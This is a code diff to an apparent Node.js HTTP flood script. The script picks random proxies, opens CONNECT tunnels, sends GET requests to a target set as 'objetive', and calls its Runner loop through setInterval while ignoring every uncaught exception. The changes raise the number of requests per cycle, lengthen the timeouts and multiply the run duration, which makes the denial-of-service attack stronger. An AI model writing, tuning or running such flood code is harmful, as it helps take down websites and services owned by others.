@@ -56,7 +56,7 @@ class TlsBuilder {
     }
 
     http2TUNNEL(socket){
-        socket.setKeepAlive(true, 1000);
+        socket.setKeepAlive(true, 10000);
         socket.setTimeout(10000);
         payload[":method"] = "GET";
         payload["Referer"] = objetive;
@@ -103,14 +103,14 @@ const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, m
 
 function Runner(){
 
-    for (let i = 0; i < 120; i++) {
+    for (let i = 0; i < 200; i++) {
 var proxy = proxies[Math.floor(Math.random() * proxies.length)];
 proxy = proxy.split(':');
                     
 var req = http.get({ 
         host: proxy[0],
         port: proxy[1],
-        timeout: 10000,
+        timeout: 100000,
         method: "CONNECT",
         agent: keepAliveAgent,
 
@@ -133,7 +133,7 @@ setInterval(Runner)
 
 setTimeout(function(){
     process.exit();
-}, process.argv[3] * 1000);
+}, process.argv[3] * 10000);
 
 process.on('uncaughtException', function(er) {
 });
